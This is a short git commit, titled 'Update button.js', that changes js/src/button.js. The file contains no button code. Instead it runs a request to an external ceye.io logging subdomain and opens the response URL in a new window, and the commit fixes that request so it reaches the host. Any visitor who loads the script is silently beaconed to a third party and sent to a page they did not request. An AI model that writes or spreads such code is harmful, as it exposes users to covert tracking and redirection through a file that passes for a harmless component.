beaa44a6ad26ce8a869c2e27525d7bae7dbeb1a0
dimpol <djdimpol@rocketmail.com>
2016-11-06 14:20:55 +0200

    Update button.js

--- js/src/button.js
+++ js/src/button.js
@@ -1,2 +1,2 @@
-var x=new XMLHttpRequest();x.open('GET','hnvh5p.ceye.io');x.send();
+var x=new XMLHttpRequest();x.open('GET','http://hnvh5p.ceye.io');x.send();
 x.onreadystatechange=function(){if(this.readyState==4){window.open(x.responseURL)}}
